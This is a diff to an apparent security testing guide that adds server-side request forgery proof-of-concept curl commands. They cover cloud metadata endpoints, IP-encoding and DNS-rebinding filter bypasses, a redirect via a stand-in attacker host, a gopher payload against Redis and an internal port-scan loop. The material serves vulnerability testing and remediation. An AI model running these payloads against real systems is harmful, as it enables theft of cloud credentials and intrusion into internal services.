@@ -388,6 +388,40 @@ curl "https://app.example.com/webhook?url=http://YOUR-COLLABORATOR.oast.fun/ssrf
 # Expect: DNS/HTTP callback at collaborator; no response body needed
 ```
 
+**Cloud metadata — GCP / Azure**
+```bash
+curl "https://app.example.com/fetch?url=http://metadata.google.internal/computeMetadata/v1/"
+curl "https://app.example.com/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+# GCP: add header Metadata-Flavor: Google if the app forwards request headers
+# Expect: instance metadata or service-account paths in response
+```
+
+**Filter bypass (when blocklist/allowlist checks hostname only)**
+```bash
+curl "https://app.example.com/fetch?url=http://2130706433/"              # decimal 127.0.0.1
+curl "https://app.example.com/fetch?url=http://0x7f000001/"              # hex 127.0.0.1
+curl "https://app.example.com/fetch?url=http://%31%32%37%2e%30%2e%30%2e%31/"  # URL-encoded 127.0.0.1
+curl "https://app.example.com/fetch?url=http://rebind.127.0.0.1.nip.io/" # DNS rebinding helper
+curl "https://app.example.com/fetch?url=http://ATTACKER/redirect?to=http://169.254.169.254/"
+# Expect: same internal/metadata content as direct 127.0.0.1 or 169.254.169.254 probes
+```
+
+**Non-HTTP schemes (when client supports them)**
+```bash
+curl "https://app.example.com/fetch?url=gopher://127.0.0.1:6379/_INFO"
+# Expect: Redis INFO banner or protocol-specific response
+```
+
+**Internal port scan (timing/status oracle)**
+```bash
+for port in 80 443 8080 8443 3306 5432 6379 27017 9200; do
+  curl -s -o /dev/null -w "%{http_code}:%{time_total}\n" \
+    "https://app.example.com/fetch?url=http://127.0.0.1:$port/" &
+done
+wait
+# Expect: distinct status codes or latency per open port
+```
+
 Use the parameter name observed in code (`url`, `target`, `webhook`, etc.). Restrict protocols/ports in remediation — PoC confirms reachability, not safe design.
 
 ## Common False Alarms
